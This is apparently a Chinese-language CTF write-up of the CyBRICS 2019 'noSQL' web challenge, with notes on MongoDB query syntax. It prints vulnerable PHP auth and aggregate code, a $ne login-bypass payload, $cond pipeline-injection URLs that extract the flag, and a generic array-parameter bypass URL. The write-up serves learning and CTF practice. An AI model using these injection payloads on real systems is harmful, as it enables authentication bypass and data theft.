---
title: 'noSQL Injection'
date: 2019-08-04
updated: 2019-08-19
category: 'ctf'
tags:
  - 'NoSQL'
  - 'cybrics'
lang: 'zh'
draft: false
---
## cybrics noSQL

这道题是cybrics的一道web题，由于是第一次接触noSQL注入，所以单独拿出来好好研究一下

php操作mongodb的语法：

```php
// connect to mongodb
$m = new MongoClient();
// select a database
$db = $m->test;
// select collection
$collection = $db->users;

$cursor = $collection->find($data);
$cursor = $collection->findone($data);
```

基本上就是实例化对象，选择数据库，选择表，然后开始查找

查询语法主要如下：

```php
db.user.find({'username': 'xxxppp'})

//查找用户名不为admin且password为123456的用户
db.user.find({'username':{$ne:'admin'}, 'password':'123456'})

//正则匹配：

db.customer.find({'name': {'$regex':'.*s.*'} })
db.user.find({'username':/jrx/i})
```

这道题目首先可以用`dirsearch`发现是git源码泄露，之后用`GitHacker.py`获取到源码

查看`index.php`，首先要登陆，需要绕过`auth`函数

```php
function auth($username, $password) {
    $collection = (new MongoDB\Client('mongodb://localhost:27017/'))->test->users;
    $raw_query = '{"username": "'.$username.'", "password": "'.$password.'"}';
    $document = $collection->findOne(json_decode($raw_query));
    if (isset($document) && isset($document->password)) {
        return true;
    }
    return false;
}
```

`username`和`password`都没有经过过滤就拼接了，但是这里有一个`json_decode`不太好过

如果没有`json_decode`函数，我们可以通过`{"username":"admin","password":{"$ne":"1"}}`绕过登陆的限制

于是这样做：

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/nosql0.png)

这样就绕过限制登陆了

来看第二个：

```php
<?php
    $filter = $_GET['filter'];

    $collection = (new MongoDB\Client('mongodb://localhost:27017/'))->test->news;

    $pipeline = [
        ['$group' => ['_id' => '$category', 'count' => ['$sum' => 1]]],
        ['$sort' => ['count' => -1]],
        ['$limit' => 5],
    ];

    $filters = [
        ['$project' => ['category' => $filter]]
    ];

    $cursor = $collection->aggregate(array_merge($filters, $pipeline));
?>
```

`array_merge`函数将`$pipeline`和`filters`进行合并

查找资料得知

> 在mongodb的aggregate中，可以使用$cond进行条件语句：

并且：

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/noSql1.png)

我们可以构造如下链接，匹配到`flag`时将其移除

`http://173.199.118.226/index.php?filter[$cond][if][$eq][]=flags&filter[$cond][if][$eq][]=$category&filter[$cond][then]=$$REMOVE&filter[$cond][else]=$category`

> 利用条件语句，发现flags时，就输出其title：

`http://173.199.118.226/index.php?filter[$cond][if][$eq][]=flags&filter[$cond][if][$eq][]=$category&filter[$cond][then]=$title&filter[$cond][else]=$category`

从title中我们得知有text，那么读取：

`http://173.199.118.226/index.php?filter[$cond][if][$eq][]=flags&filter[$cond][if][$eq][]=$category&filter[$cond][then]=$text&filter[$cond][else]=$category`

就可以获得flag了

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/nosql2.png)

## NoSQL注入实践

MongoDb作为一个NoSQL的数据库，操作其实还是很SQL很相似的

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/nosql3.png)

都有数据库，不同的是集合对应于表，文档对应于行，字段对应于列

这张图显示了映射关系：

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/nosql4.png)

于是操作MongoDb时可以理解为选择数据库，然后选择collection，然后构造查询语句进行查询

比如demo.html

`$m = new MongoClient()`连接数据库，`$db=$m->test`选择test数据库，然后选择collection : `$collection=$db->uses`

构造的查询语句为：

```
$data = array(
		'username' =>  $_REQUEST['username'],
		'password' =>  $_REQUEST['password']
		
);
```

之后进行查询： `$cursor = $collection->find($data)`

这里没有字符串的拼接，似乎无法注入，但是如果我们传入的username和password都是数组的话，那么查询的语句就会成为这样：

构造的URL：`http://localhost/NoSQLI/login/login.php?username[$ne]=1&password[$ne]=1&login-submit=login`

此时拼接的`$data`

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/nosql5.png)

json\_encode后得到：  
`"{"username":{"$ne":"1"},"password":{"$ne":"1"}}"`

## 参考

[NoSQL注入总结(MongoDB)](https://blog.szfszf.top/tech/nosql%e6%b3%a8%e5%85%a5%e6%80%bb%e7%bb%93mongodb/#MongoDB)

[019 CyBRICS CTF Quals wp](https://skysec.top/2019/07/22/CyBRICS-CTF-Quals-2019-Web-Writeup/)
